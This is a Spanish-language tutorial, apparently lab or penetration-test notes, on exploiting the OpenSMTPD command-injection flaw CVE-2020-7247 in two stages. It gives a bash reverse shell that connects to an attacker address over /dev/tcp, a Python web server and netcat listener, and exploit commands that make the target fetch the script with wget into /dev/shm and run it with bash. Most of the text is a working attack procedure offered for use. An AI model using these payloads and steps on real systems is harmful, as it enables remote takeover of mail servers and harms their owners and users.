# **Explotación Fiable de OpenSMTPD (CVE-2020-7247): Técnica Multi-Fase con Descarga y Ejecución**

La explotación de vulnerabilidades de inyección de comandos a menudo presenta desafíos que impiden el éxito de un "one-liner" (un payload de una sola línea). Caracteres especiales, limitaciones de longitud o validaciones del servicio intermediario pueden hacer que el payload falle.

La estrategia profesional para superar estos obstáculos es desacoplar el ataque en múltiples fases. El siguiente método, **"Descargar y Ejecutar" (Download and Execute)**, es una técnica robusta que aumenta drásticamente la probabilidad de éxito.

## 1\. Fundamentos de la Estrategia Multi-Fase

Este enfoque se divide en dos pasos discretos y lógicos:

1.  **Fase 1 - Entrega del Payload**: Utilizar la vulnerabilidad una primera vez con un único propósito: forzar al sistema víctima a descargar nuestro script malicioso desde un servidor que controlamos y guardarlo en una ubicación escribible del sistema de archivos (como `/dev/shm` o `/tmp`).
2.  **Fase 2 - Activación del Payload**: Utilizar la vulnerabilidad una segunda vez para ejecutar un comando muy simple: el que lanza el script que acabamos de subir.

**Ventajas de este método:**

  * **Fiabilidad**: Los comandos para descargar (`wget`, `curl`) y ejecutar (`bash`, `sh`) son simples y no contienen metacaracteres complejos que puedan ser filtrados.
  * **Flexibilidad**: El script de reverse shell puede ser tan complejo como sea necesario, ya que su contenido no pasa directamente por el servicio vulnerable.
  * **Depuración Sencilla**: Si algo falla, es más fácil diagnosticar en qué fase ocurrió el problema (¿falló la descarga o la ejecución?).

## 2\. Prerrequisitos para la Explotación

1.  **Destinatario Válido**: El exploit de OpenSMTPD requiere que el comando `RCPT TO` se envíe a un destinatario de correo que el servidor reconozca como válido. Es imprescindible haber enumerado previamente un usuario existente en el sistema y haberlo configurado en el script del exploit.
2.  **Servidor HTTP Local**: Se debe tener un servidor web simple en la máquina del atacante para alojar el script de la reverse shell.

## 3\. Proceso de Explotación (Caso Práctico)

### **Paso 1: Preparar el Entorno del Atacante**

1.  **Crear el script de la reverse shell**:
    En la máquina del atacante, crear un archivo (ej. `index.html` o `shell.sh`) con el contenido de la shell. Es importante incluir el "shebang" (`#!/bin/bash`) para asegurar que se interprete con Bash.
    ```bash
    #!/bin/bash
    bash -i >& /dev/tcp/10.10.14.7/443 0>&1
    ```
2.  **Iniciar el servidor web**:
    Desde el directorio donde se guardó el script, iniciar un servidor HTTP simple.
    ```bash
    python3 -m http.server 80
    ```
3.  **Iniciar el listener de Netcat**:
    Preparar el listener para recibir la conexión entrante.
    ```bash
    nc -lvnp 443
    ```

### **Paso 2: Ejecutar la Fase 1 (Descarga del Payload)**

Utilizar el exploit para ejecutar un comando `wget` en el servidor víctima. Este comando descargará el script desde nuestro servidor y lo guardará en `/dev/shm/reverse`. El directorio `/dev/shm` es una excelente elección, ya que es una partición en memoria y suele ser escribible por la mayoría de los usuarios.

```bash
proxychains4 -q python3 47984.py 10.241.251.113 25 'wget 10.10.14.7 -O /dev/shm/reverse'
```

  * **Análisis del Comando**:
      * `wget 10.10.14.7`: Descarga el archivo `index.html` (por defecto) de nuestro servidor.
      * `-O /dev/shm/reverse`: Guarda el contenido descargado en el archivo `/dev/shm/reverse`.

Una vez ejecutado, el exploit confirmará el envío (`[*] Payload sent`). En los logs de nuestro servidor Python, deberíamos ver una petición GET desde la IP de la víctima.

### **Paso 3: Ejecutar la Fase 2 (Activación del Payload)**

Ahora que el script malicioso está en su sitio, se vuelve a lanzar el exploit con un comando diferente y muy simple: ejecutar el script con `bash`.

```bash
proxychains4 -q python3 47984.py 10.241.251.113 25 'bash /dev/shm/reverse'
```

  * **Análisis del Comando**:
      * `bash /dev/shm/reverse`: Le dice al sistema que interprete y ejecute el archivo con Bash. No se necesita `chmod +x` porque se está invocando el intérprete directamente.

Inmediatamente después de ejecutar este comando, el listener de `netcat` debería recibir la conexión, otorgando una shell interactiva en el sistema comprometido.